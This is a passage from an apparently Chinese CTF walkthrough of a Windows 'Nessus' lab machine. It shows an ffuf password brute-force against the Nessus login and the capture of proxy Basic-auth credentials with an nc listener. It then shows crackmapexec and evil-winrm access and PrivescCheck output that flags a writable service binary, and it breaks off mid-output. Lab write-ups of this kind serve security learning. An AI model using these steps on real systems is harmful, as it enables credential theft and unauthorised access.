Chromaticity Colorant           : Unknown
Chromaticity Channel 1          : 0.64 0.33
Chromaticity Channel 2          : 0.3 0.60001
Chromaticity Channel 3          : 0.14999 0.06
Profile Copyright               : no copyright, use freely
XMP Toolkit                     : Image::ExifTool 12.76
Date                            : 2024:10:18 15:10:05+02:00
Format                          : application/pdf
Language                        : x-unknown
Author                          : Jose
PDF Version                     : 1.4
Producer                        : Apache FOP Version 2.8
Create Date                     : 2024:10:18 15:10:05+02:00
Creator Tool                    : Apache FOP Version 2.8
Metadata Date                   : 2024:10:18 15:10:05+02:00
Page Mode                       : UseOutlines
Creator                         : Apache FOP Version 2.8
======== Web Application Tests_f6jg9t.pdf
ExifTool Version Number         : 13.10
File Name                       : Web Application Tests_f6jg9t.pdf
Directory                       : .
File Size                       : 136 kB
File Modification Date/Time     : 2025:06:09 03:48:22-04:00
File Access Date/Time           : 2025:06:09 03:48:23-04:00
File Inode Change Date/Time     : 2025:06:09 03:48:22-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
Linearized                      : No
Page Count                      : 6
Profile CMM Type                : Little CMS
Profile Version                 : 2.3.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2004:08:13 12:18:06
Profile File Signature          : acsp
Primary Platform                : Microsoft Corporation
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : Little CMS
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 7fb30d688bf82d32a0e748daf3dba95d
Device Mfg Desc                 : lcms generated
Profile Description             : sRGB
Device Model Desc               : sRGB
Media White Point               : 0.95015 1 1.08826
Red Matrix Column               : 0.43585 0.22238 0.01392
Blue Matrix Column              : 0.14302 0.06059 0.71384
Green Matrix Column             : 0.38533 0.71704 0.09714
Red Tone Reproduction Curve     : (Binary data 2060 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 2060 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 2060 bytes, use -b option to extract)
Chromaticity Channels           : 3
Chromaticity Colorant           : Unknown
Chromaticity Channel 1          : 0.64 0.33
Chromaticity Channel 2          : 0.3 0.60001
Chromaticity Channel 3          : 0.14999 0.06
Profile Copyright               : no copyright, use freely
XMP Toolkit                     : Image::ExifTool 12.76
Date                            : 2024:10:18 15:10:19+02:00
Format                          : application/pdf
Language                        : x-unknown
Author                          : Jose
PDF Version                     : 1.4
Producer                        : Apache FOP Version 2.8
Create Date                     : 2024:10:18 15:10:19+02:00
Creator Tool                    : Apache FOP Version 2.8
Metadata Date                   : 2024:10:18 15:10:19+02:00
Page Mode                       : UseOutlines
Creator                         : Apache FOP Version 2.8
    3 image files read

```

## 爆破登录信息
发现了作者信息为`Jose`，尝试抓包爆破那个登录界面：

![](/image/hmvmachines/Nessus-4.png)

 得到密码：`tequiero`。也可以使用别的办法比如ffuf

这我尝试过hydra一直报错我真没招了

```c
┌──(kali㉿kali)-[~/temp/Nessus]
└─$ ffuf -u 'https://192.168.10.100:8834/session' -w /usr/share/wordlists/rockyou.txt -d '{"username":"jose","password":"FUZZ"}' -H 'Content-Type: application/json' -fc 401

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://192.168.10.100:8834/session
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"username":"jose","password":"FUZZ"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 401
________________________________________________

tequiero                [Status: 200, Size: 179, Words: 1, Lines: 1, Duration: 1796ms]

```

### 登录获取认证信息
网上搜了下没找到反弹shell方法

![](/image/hmvmachines/Nessus-5.png)

将攻击机ip端口添加上去nc进行监听

```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# nc -lvvp 4444
listening on [any] 4444 ...
192.168.0.107: inverse host lookup failed: Unknown host
connect to [192.168.0.108] from (UNKNOWN) [192.168.0.107] 49758

EHLO Nessus

RSET

MAIL FROM: <>

QUIT

 sent 5, rcvd 40 : Connection reset by peer

```

没啥东西，换一个

![](/image/hmvmachines/Nessus-6.png)

```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# nc -lvvp 4444
listening on [any] 4444 ...
192.168.0.107: inverse host lookup failed: Unknown host
connect to [192.168.0.108] from (UNKNOWN) [192.168.0.107] 49784
CONNECT plugins.nessus.org:443 HTTP/1.1
Host: plugins.nessus.org
Connection: keep-Alive
User-Agent: Nessus/10.7.3
Content-Length: 0
Proxy-Connection: Keep-Alive



```

没啥东西 切换一下`Auth Method`

换到basic时出现编码

```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# nc -lvvp 4444
listening on [any] 4444 ...
192.168.0.107: inverse host lookup failed: Unknown host
connect to [192.168.0.108] from (UNKNOWN) [192.168.0.107] 49809
CONNECT plugins.nessus.org:443 HTTP/1.1
Proxy-Authorization: Basic bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ==
Host: plugins.nessus.org
Connection: keep-Alive
User-Agent: Nessus/10.7.3
Content-Length: 0
Proxy-Connection: Keep-Alive
```

```c
┌──(kali㉿kali)-[~]
└─$ echo 'bmVzdXM6WiNKdVhIJHBoLTt2QCxYJm1WKQ==' |base64 -d   
nesus:Z#JuXH$ph-;v@,X&mV) 
```

# 二次信息收集
## enum4linux
尝试了下没成功

### crackmapexec
```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# crackmapexec smb 192.168.0.107 --groups --loggedon-users -u nesus -p 'Z#JuXH$ph-;v@,X&mV)'
SMB         192.168.0.107   445    NESSUS           [*] Windows Server 2022 Build 20348 x64 (name:NESSUS) (domain:Nessus) (signing:False) (SMBv1:False)
SMB         192.168.0.107   445    NESSUS           [-] Nessus\nesus:Z#JuXH$ph-;v@,X&mV) STATUS_PASSWORD_EXPIRED 
```

STATUS_PASSWORD_EXPIRED 

# 靶机密码过期
windows靶机的常见bug，认证过期了，尝试重置密码进行更新靶机： 

`ctrl+alt+del`(virtualbox 里面是右键ctrl+del)解锁，然后按esc返回上一级：

![](/image/hmvmachines/Nessus-7.png)

点击`nesus`，然后输入密码以后：

![](/image/hmvmachines/Nessus-8.png)

`enter`一下，换完密码以后：

![](/image/hmvmachines/Nessus-9.png)

这里再`enter`一下，我修改的是`password`



## evil-winrm连接
```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# evil-winrm -i 192.168.0.107 -u 'nesus' -p 'password'

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                              
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                         
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nesus\Documents> 

```

# 提权
上传msf木马被杀了

上传winPEAS被杀了，上传winPEAS.bat倒是成功

不过，没找到什么提权点

用到了这个脚本：https://github.com/itm4n/PrivescCheck  

```c
*Evil-WinRM* PS C:\Users\nesus\Documents> .\PrivescCheck.ps1
*Evil-WinRM* PS C:\Users\nesus\Documents> Invoke-PrivescCheck
The term 'Invoke-PrivescCheck' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ Invoke-PrivescCheck
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Invoke-PrivescCheck:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```

👉 只会“跑一遍脚本文件”  
👉 不会把里面定义的函数注册到当前 PowerShell 会话

所以后面：

```plain
Invoke-PrivescCheck
```

必然报：

```plain
CommandNotFoundException
```

## ✅ 正确姿势（就差这一步）
### ✅ 方法 1（最推荐）：点源（dot sourcing）
⚠️ 注意：前面有一个点 + 空格

```plain
. .\PrivescCheck.ps1
```

然后再执行：

```plain
Invoke-PrivescCheck
```

✔ 这一步才是“把函数加载进当前会话”

---

### ✅ 方法 2：Import-Module（也行）
```plain
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck
```

```plain
*Evil-WinRM* PS C:\Users\nesus\Documents> .\PrivescCheck.ps1
*Evil-WinRM* PS C:\Users\nesus\Documents> Invoke-PrivescCheck
The term 'Invoke-PrivescCheck' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ Invoke-PrivescCheck
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Invoke-PrivescCheck:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\nesus\Documents> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
????????????????????????????????????????????????????????????????
? CATEGORY ? TA0043 - Reconnaissance                           ?
? NAME     ? User - Identity                                   ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Get information about the current user (name, domain name)   ?
? and its access token (SID, integrity level, authentication   ?
? ID).                                                         ?
????????????????????????????????????????????????????????????????


Name             : NESSUS\nesus
SID              : S-1-5-21-2986980474-46765180-2505414164-1001
IntegrityLevel   : Medium Mandatory Level (S-1-16-8192)
SessionId        : 0
TokenId          : 00000000-000a8454
AuthenticationId : 00000000-00091fba
OriginId         : 00000000-00000000
ModifiedId       : 00000000-00091fd8
Source           : NtLmSsp (00000000-00000000)



[*] Status: Informational - Severity: None - Execution time: 00:00:00.190


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0043 - Reconnaissance                           ?
? NAME     ? User - Groups                                     ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Get information about the groups the current user belongs to ?
? (name, type, SID).                                           ?
????????????????????????????????????????????????????????????????

Name                                   Type           SID
----                                   ----           ---
NESSUS\None                            Group          S-1-5-21-2986980474-46765180-2505414164-513
Everyone                               WellKnownGroup S-1-1-0
BUILTIN\Remote Management Users        Alias          S-1-5-32-580
BUILTIN\Users                          Alias          S-1-5-32-545
NT AUTHORITY\NETWORK                   WellKnownGroup S-1-5-2
NT AUTHORITY\Authenticated Users       WellKnownGroup S-1-5-11
NT AUTHORITY\This Organization         WellKnownGroup S-1-5-15
NT AUTHORITY\Local account             WellKnownGroup S-1-5-113
NT AUTHORITY\NTLM Authentication       WellKnownGroup S-1-5-64-10
Mandatory Label\Medium Mandatory Level Label          S-1-16-8192


[*] Status: Informational - Severity: None - Execution time: 00:00:00.101


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? User - Privileges                                 ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user is granted privileges that    ?
? can be leveraged for local privilege escalation.             ?
????????????????????????????????????????????????????????????????

Name                          State   Description                    Exploitable
----                          -----   -----------                    -----------
SeChangeNotifyPrivilege       Enabled Bypass traverse checking             False
SeIncreaseWorkingSetPrivilege Enabled Increase a process working set       False


[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.068


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? User - Privileges (GPO)                           ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user is granted privileges,        ?
? through a group policy, that can be leveraged for local      ?
? privilege escalation.                                        ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.114


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? User - Environment Variables                      ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether any environment variables contain sensitive    ?
? information such as credentials or secrets. Note that this   ?
? check follows a keyword-based approach and thus might not be ?
? completely reliable.                                         ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (nothing found) - Severity: None - Execution time: 00:00:00.046


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Services - Non-Default Services                   ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Get information about third-party services. It does so by    ?
? parsing the target executable's metadata and checking        ?
? whether the publisher is Microsoft.                          ?
????????????????????????????????????????????????????????????????


Name        : fsMT
DisplayName : fsMT
ImagePath   : C:\Windows\gAwFavaS.exe
User        : LocalSystem
StartMode   : Manual

Name        : ssh-agent
DisplayName : OpenSSH Authentication Agent
ImagePath   : C:\Windows\System32\OpenSSH\ssh-agent.exe
User        : LocalSystem
StartMode   : Disabled

Name        : Tenable Nessus
DisplayName : Tenable Nessus
ImagePath   : "C:\Program Files\Tenable\Nessus\nessus-service.exe"
User        : LocalSystem
StartMode   : Automatic

Name        : tldJ
DisplayName : tldJ
ImagePath   : C:\Windows\iAkZGZHW.exe
User        : LocalSystem
StartMode   : Manual



[*] Status: Informational - Severity: None - Execution time: 00:00:01.121


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Services - Known Vulnerable Kernel Drivers        ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether known vulnerable kernel drivers are installed. ?
? It does so by computing the file hash of each driver and     ?
? comparing the value against the list provided by             ?
? loldrivers.io.                                               ?
????????????????????????????????????????????????????????????????
WARNING: Service: RasGre | Path not found: C:\Windows\System32\drivers\rasgre.sys
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:16.700


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Services - Permissions                            ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user has any write permissions on  ?
? a service through the Service Control Manager (SCM).         ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:05.880


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Services - Registry Permissions                   ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user has any write permissions on  ?
? the configuration of a service in the registry.              ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:01.299


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Services - Image File Permissions                 ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user has any write permissions on  ?
? a service's binary or its folder.                            ?
????????????????????????????????????????????????????????????????
WARNING: QueryServiceStatusEx - The handle is invalid (6)


Name              : Tenable Nessus
DisplayName       : Tenable Nessus
User              : LocalSystem
ImagePath         : "C:\Program Files\Tenable\Nessus\nessus-service.exe"
StartMode         : Automatic
Type              : Win32OwnProcess
RegistryKey       : HKLM\SYSTEM\CurrentControlSet\Services
RegistryPath      : HKLM\SYSTEM\CurrentControlSet\Services\Tenable Nessus
Status            :
UserCanStart      : False
UserCanStop       : False
ModifiablePath    : C:\Program Files\Tenable\Nessus\nessus-service.exe
IdentityReference : NESSUS\nesus (S-1-5-21-2986980474-46765180-2505414164-1001)
Permissions       : AllAccess



[*] Status: Vulnerable - Severity: High - Execution time: 00:00:05.979


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Services - Unquoted Paths                         ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether there are services configured with an          ?
? exploitable unquoted path that contains spaces.              ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.082


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Services - Service Control Manager Permissions    ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user has any write permissions on  ?
? the Service Control Manager (SCM).                           ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.036


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Scheduled Tasks - Image File Permissions          ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user has any write permissions on  ?
? a scheduled task's binary or its folder. Note that           ?
? low-privileged users cannot list all the scheduled tasks.    ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:01.279


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Credentials - Hive File Permissions               ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user has read permissions on the   ?
? SAM/SYSTEM/SECURITY hive files, either in the system folder  ?
? or in volume shadow copies (CVE-2021-36934 - HiveNightmare). ?
????????????????????????????????????????????????????????????????
WARNING: NtOpenSymbolicLinkObject('\Device\BootDevice') - Access is denied (5)
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.213


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Credentials - Unattend Files                      ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether there are any 'unattend' files and whether     ?
? they contain clear-text credentials.                         ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.023


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Credentials - WinLogon                            ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the 'WinLogon' registry key contains           ?
? clear-text credentials. Note that entries with an empty      ?
? password field are filtered out.                             ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.026


WARNING: Check 'Credentials - Vault (creds)' is categorized as risky, but the option '-Risky' was
not specified, ignoring...
WARNING: Check 'Credentials - Vault (list)' is categorized as risky, but the option '-Risky' was
not specified, ignoring...
????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Credentials - Group Policy Preferences (GPP)      ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether there are cached Group Policy Preference (GPP) ?
? files that contain clear-text passwords.                     ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.040


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Credentials - SCCM Network Access Account (NAA)   ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether SCCM NAA credentials are stored in the WMI     ?
? repository. If so, the username and password DPAPI blobs are ?
? returned, but can only be decrypted using the SYSTEM's DPAPI ?
? user key.                                                    ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.220


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Credentials - SCCM Cache Folder                   ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the SCCM cache folders contain files with      ?
? potentially hard coded credentials, or secrets, using basic  ?
? keywords such as 'password', or 'secret'.                    ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.024


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Credentials - Symantec Account Connectivity       ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether a Symantec Management Agent (SMA) is installed ?
? and whether Account Connectivity Credentials (ACCs) are      ?
? stored locally.                                              ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.024


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Credentials - SCOM Run As Account                 ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the event logs contain traces of SCOM Run As   ?
? accounts being used locally. If so, the clear-text           ?
? credentials of those accounts can be extracted from the      ?
? registry with administrator privileges.                      ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.029


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Hardening - LSA Protection                        ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether LSA protection is enabled. Note that when LSA  ?
? protection is enabled, 'lsass.exe' runs as a Protected       ?
? Process Light (PPL) and thus can only be accessed by other   ?
? protected processes with an equivalent or higher protection  ?
? level.                                                       ?
????????????????????????????????????????????????????????????????


Key         : HKLM\SYSTEM\CurrentControlSet\Control\Lsa
Value       : RunAsPPL
Data        : (null)
Description : LSA Protection is not enabled.



[*] Status: Vulnerable - Severity: Low - Execution time: 00:00:00.034


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0006 - Credential Access                        ?
? NAME     ? Hardening - Credential Guard                      ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether Credential Guard is supported and enabled.     ?
? Note that when Credential Guard is enabled, credentials are  ?
? stored in an isolated process ('LsaIso.exe') that cannot be  ?
? accessed, even if the kernel is compromised.                 ?
????????????????????????????????????????????????????????????????


LsaCfgFlagsPolicyKey       : HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard
LsaCfgFlagsPolicyValue     : LsaCfgFlags
LsaCfgFlagsPolicyData      : (null)
LsaCfgFlagsKey             : HKLM\SYSTEM\CurrentControlSet\Control\LSA
LsaCfgFlagsValue           : LsaCfgFlags
LsaCfgFlagsData            : (null)
LsaCfgFlagsDescription     : Credential Guard is not configured.
CredentialGuardConfigured  : False
CredentialGuardRunning     : False
CredentialGuardDescription : Credential Guard is not configured. Credential Guard is not running.



[*] Status: Vulnerable - Severity: Low - Execution time: 00:00:05.477


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0008 - Lateral Movement                         ?
? NAME     ? Hardening - LAPS                                  ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether LAPS is configured and enabled. Note that this ?
? applies to domain-joined machines only.                      ?
????????????????????????????????????????????????????????????????


Description : The machine is not domain-joined, this check is irrelevant.



[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.075


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0001 - Initial Access                           ?
? NAME     ? Hardening - BitLocker                             ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether BitLocker is enabled on the system drive and   ?
? requires a second factor of authentication (PIN or startup   ?
? key). Note that this check might yield a false positive if a ?
? third-party drive encryption software is installed.          ?
????????????????????????????????????????????????????????????????
WARNING: No TPM device found.


MachineRole : Server
TpmPresent  : False
Description : Not a workstation, BitLocker configuration is irrelevant.



[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.077


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Configuration - PATH Folder Permissions           ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the current user has any write permissions on  ?
? the system-wide PATH folders. If so, the system could be     ?
? vulnerable to privilege escalation through ghost DLL         ?
? hijacking.                                                   ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.142


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Misc - Known Ghost DLLs                           ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Get information about services that are known to be prone to ?
? ghost DLL hijacking. Note that their exploitation requires   ?
? the current user to have write permissions on at least one   ?
? system-wide PATH folder.                                     ?
????????????????????????????????????????????????????????????????


Name           : WptsExtensions.dll
Description    : Loaded by the Task Scheduler service (Schedule) upon startup.
RunAs          : LocalSystem
RebootRequired : True
Link           : http://remoteawesomethoughts.blogspot.com/2019/05/windows-10-task-schedulerservic
                 e.html



[*] Status: Informational - Severity: None - Execution time: 00:00:00.066


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Configuration - NTLM Downgrade (NTLMv1)           ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the machine is vulnerable to NTLM downgrade    ?
? attacks. If so, a local or remote attacker could capture the ?
? NTLMv1 authentication of the computer account (or another    ?
? authenticated user), and recover its NT hash offline.        ?
????????????????????????????????????????????????????????????????


NtlmMinServerSec                        : 536870912
NtlmMinServerSecDescription             : Require 128-bit encryption
BlockNtlmv1SSO                          : 0
BlockNtlmv1SSODescription               : The request to generate NTLMv1-credentials for a
                                          logged-on user is audited but allowed to succeed.
                                          Warning events are generated. This setting is also
                                          called Audit mode.
NtlmMinClientSec                        : 536870912
NtlmMinClientSecDescription             : Require 128-bit encryption
RestrictSendingNTLMTraffic              : 0
RestrictSendingNTLMTrafficDescription   : Allow all
RestrictReceivingNTLMTraffic            : 0
RestrictReceivingNTLMTrafficDescription : Allow all
LmCompatibilityLevel                    : 3
LmCompatibilityLevelDescription         : Send NTLMv2 response only
CredentialGuard                         : Credential Guard is not configured. Credential Guard is
                                          not running.



[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:05.066


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Configuration - MSI AlwaysInstallElevated         ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the 'AlwaysInstallElevated' policy is enabled  ?
? system-wide and for the current user. If so, the current     ?
? user may install a Windows Installer package with elevated   ?
? (SYSTEM) privileges.                                         ?
????????????????????????????????????????????????????????????????


LocalMachineKey   : HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
LocalMachineValue : AlwaysInstallElevated
LocalMachineData  : (null)
Description       : AlwaysInstallElevated is not enabled in HKLM.



[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.024


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0008 - Lateral Movement                         ?
? NAME     ? Configuration - WSUS                              ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether WSUS uses the HTTPS protocol to retrieve       ?
? updates from the on-premise update server. If WSUS uses the  ?
? clear-text HTTP protocol, it is vulnerable to MitM attacks   ?
? that may result in remote code execution as SYSTEM.          ?
????????????????????????????????????????????????????????????????


Key         : HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
Value       : WUServer
Data        : (null)
Description : No WSUS server is configured (default).

Key         : HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
Value       : UseWUServer
Data        : (null)
Description : WSUS server not enabled (default).

Key         : HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
Value       : SetProxyBehaviorForUpdateDetection
Data        : (null)
Description : Proxy fallback not configured (default).

Key         : HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
Value       : DisableWindowsUpdateAccess
Data        : (null)
Description : Windows Update features are enabled (default).



[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.027


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0008 - Lateral Movement                         ?
? NAME     ? Configuration - Hardened UNC Paths                ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether sensitive UNC paths are properly hardened.     ?
? Note that non-hardened UNC paths used for retrieving group   ?
? policies can be hijacked through an MitM attack to obtain    ?
? remote code execution as SYSTEM.                             ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.035


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Configuration - Point and Print                   ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether the Print Spooler service is enabled and if    ?
? the Point and Print configuration allows non-administrator   ?
? users to install printer drivers.                            ?
????????????????????????????????????????????????????????????????


Description : The Print Spooler service is disabled.



[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.039


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Configuration - Application Repair Whitelist      ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether a whitelist of MSI packages is set in the      ?
? registry to disable UAC prompts, and whether they have       ?
? custom actions that may be leveraged for local privilege     ?
? escalation.                                                  ?
????????????????????????????????????????????????????????????????
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.087


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Updates - Update History                          ?
? TYPE     ? Base                                              ?
????????????????????????????????????????????????????????????????
? Check whether a Windows security update was installed within ?
? the last 31 days.                                            ?
????????????????????????????????????????????????????????????????
WARNING: Failed to retrieve hotfix history.
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:05.749


????????????????????????????????????????????????????????????????
? CATEGORY ? TA0004 - Privilege Escalation                     ?
? NAME     ? Misc - Process and Thread Permissions             ?
? TYPE     ? Base                                              ?
